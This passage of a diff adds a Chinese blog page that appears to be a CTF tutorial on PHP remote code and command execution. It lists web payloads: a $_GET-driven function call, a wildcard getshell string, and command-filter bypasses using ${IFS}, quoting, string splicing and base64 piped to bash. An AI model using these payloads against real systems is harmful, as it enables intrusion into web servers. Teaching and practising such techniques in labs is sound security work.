class="token variable">$__</span><span class="token punctuation">.</span><span class="token variable">$C</span><span class="token punctuation">.</span><span class="token variable">$_</span><span class="token punctuation">;</span>
+$<span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$<span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  相当于  <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     数字被过滤的话，换成下划线就行，或者用上面的方法来取<span class="token number">0</span>，<span class="token number">1</span>
+</code></pre>
+<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>使用 &#96; + shell  的方式来getshell</p>
+<p>shell下可以用 . 来执行任意脚本</p>
+<p>Linux下支持glob通配符代替 . 或者叫 period，它的作用和source一样，就是用当前的shell执行一个文件中的命令，例如 .file 就是执行file文件中的命令</p>
+<p>glob通配符<br>*代替0个以上的任意字符<br>?代替1个任意字符<br>用[^x]来表示 这个位置不是字符x<br>[0-9]来表示一位数<br>更多glob内容可看：<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/glob.7.html">https://man7.org/linux/man-pages/man7/glob.7.html</a><br>例题<br><img src="https://bu.dusays.com/2021/09/14/0a5bd992c836f.png" alt="津门杯.png"></p>
+<p>payload：?code&#x3D;?&gt;<?=`/???/??? /????`?></p>
+<h2 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h2><h3 id="常用linux命令"><a href="#常用linux命令" class="headerlink" title="常用linux命令"></a>常用linux命令</h3><p>这里介绍一些常用的，更多命令请前往：<a target="_blank" rel="noopener" href="https://deepinout.com/linux-cmd">https://deepinout.com/linux-cmd</a></p>
+<ul>
+<li><p>查看文件<br>cat、tac、nl、more、less、head、tail、tailf、od、sort、rev、strings、cut</p>
+</li>
+<li><p>查找文件<br>find . -name “fla”<br>​    <a target="_blank" rel="noopener" href="https://deepinout.com/linux-cmd/linux-string-file-cmd-search-cmd/linux-cmd-locate.html">locate</a> fla*    locate命令无需指定路径，而是在一个 mlocate.db 的数据库下搜索。这个数据库位于 &#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db ,它包含了系统里所有文件的索引，并会每天由 corn 工具自动更新一次，可以 sudo updadb 更新其数据库</p>
+<p>​    <a target="_blank" rel="noopener" href="https://deepinout.com/linux-cmd/linux-string-file-cmd-search-cmd/linux-cmd-which.html">which</a>    命令主要用来查找可执行文件(也就是命令)的位置</p>
+<p>​    <a target="_blank" rel="noopener" href="https://deepinout.com/linux-cmd/linux-string-file-cmd-search-cmd/linux-cmd-whereis.html">whereis</a>   命令会在系统默认安装目录(一般是有root权限时默认安装的软件)查找二进制文件、源码、文档中包含给定查询关键词的文件</p>
+</li>
+<li><p>查找文件内容</p>
+<p>​    grep -ar fla* &#x2F;      -a不忽略二进制文件</p>
+</li>
+<li><p>文件传输</p>
+<p>​    curl   利用curl下载文件</p>
+</li>
+</ul>
+<pre class=" language-shell"><code class="language-shell">curl -o dodo1.jpg http://url/dodo1.jpg    #使用内置option：-o(小写)
+curl -O http://url/dodo1.jpg       #使用内置option：-o(大写)
+</code></pre>
+<ul>
+<li><p>列目录</p>
+<p>​    ls、dir</p>
+</li>
+<li><p>命令分隔符</p>
+<p>​    %0a 换行符</p>
+<p>​    %0d 回车符</p>
+<p>​    ; 执行连续命令</p>
+<p>​    &amp; 不执行错误检查，运行所有命令</p>
+<p>​    &amp;&amp; 前一条命令执行成功才执行后面的命令</p>
+<p>​    || 成功执行一次命令就结束，不管后面还有没有命令</p>
+<p>​    | 符号左边命令的输出作为符号右边的输入，所以左边的输出不显示</p>
+<p>​    %00%20# 命令终止符</p>
+</li>
+</ul>
+<h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><ul>
+<li><p>${IFS}</p>
+<p>​    payload1: cat${IFS}flag</p>
+<p>​    payload2: cat${IFS}$9flag  $9是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
+<p>​    payload3: cat$IFS$9flag</p>
+</li>
+<li><p>重定向&lt;&gt;<br>payload1: cat&lt;&gt;flag<br>​    payload2: cat&lt;flag</p>
+</li>
+<li><p>%09    需要php环境</p>
+</li>
+<li><p>{cat,flag}  用逗号实现空格功能</p>
+</li>
+</ul>
+<h3 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h3><ul>
+<li><p>拼接</p>
+<p>​    d&#x3D;ag;a&#x3D;c;c&#x3D;fl;b&#x3D;at;$a$b $c$d;</p>
+</li>
+<li><p>base64编码</p>
+<p>​    `echo “Y2F0IGZsYWc&#x3D;”|base64 -d`</p>
+<p>​    echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash   (bash被过滤可以用sh)</p>
+</li>
+<li><p>单引号、双引号</p>
+<p>​    c””at fl’’ag</p>
+</li>
+<li><p>反斜线</p>
+<p>​    c\at f\lag</p>
+</li>
+<li><p>{}</p>
+<p>​    <code>curl http://example.com/a.p&#123;a..z&#125;p</code>，一般是在命令的参数中使用，命令测试了基本上不行</p>
+</li>
+<li><p>$1、$2等和$@</p>
+<blockquote>
+<p>$# 是传给脚本的参数个数<br>$0 是脚本本身的名字<br>$1 是传递给该shell脚本的第一个参数<br>$2 是传递给该shell脚本的第二个参数<br>$@ 是传给脚本的所有参数的列表<br>$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个<br>$$ 是脚本运行的当前进程ID号<br>$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</p>
+</blockquote>
+</li>
+<li><p>利用环境变量构造命令</p>
+<pre><code>$&#123;PATH&#125;   命令搜寻路径
+$&#123;PWD&#125;   当前路径
+$&#123;USER&#125;   当前用户
+$&#123;PHP&#125;
+$&#123;PHP_VERSION&#125;   php版本
+$&#123;SHLVL&#125;深度-SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$SHLVL=2。    
+$?    执行上一个指令的返回值(0表示没有错误，其他任何值表明有错误)
+$&#123;RANDOM&#125;   获得(因为具有随机性，所以要多尝试直到随机出4来)
+大写字母表示倒数开始，A倒数第一位，B倒数第二位......
+$&#123;PHP_CFLAGS&#125;
+</code></pre>
+</li>
+<li><p>~$()构造数字</p>
+</li>
+</ul>
+<h3 id="分号过滤"><a href="#分号过滤" class="headerlink" title="分号过滤"></a>分号过滤</h3><p>​      %0a</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Lees</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lees01.gitee.io/2021/08/24/php-dai-ma-ming-ling-zhi-xing/">https://lees01.gitee.io/2021/08/24/php-dai-ma-ming-ling-zhi-xing/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Lees</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/rce/">
+                                    <span class="chip bg-color">rce</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/08/27/md-yu-fa/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="md语法">
+                        
+                        <span class="card-title">md语法</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            ​
+
+支持平台：微信公众号。​支持注音符号，用法如下：​Markdown Nice 这么好用，简直是{喜大普奔|hē hē hē hē}呀！
+
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Lees
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/08/24/gong-ju/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="在线工具链接">
+                        
+                        <span class="card-title">在线工具链接</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            图床
+晚风：https://pic.alexhchu.com/
+去不：https://7bu.top/
+
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%B7%A5%E5%85%B7/" class="post-category">
+                                    工具
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%B7%A5%E5%85%B7/">
+                        <span class="chip bg-color">工具</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('100')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Lees&#39;s Blog<br />'
+            + '文章作者: Lees<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021-2022</span>
+            
+            <a href="/about" target="_blank">Lees</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">19.7k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2021";
+                        var startMonth = "9";
+                        var startDate = "5";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:lees01@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2578546966" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2578546966" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
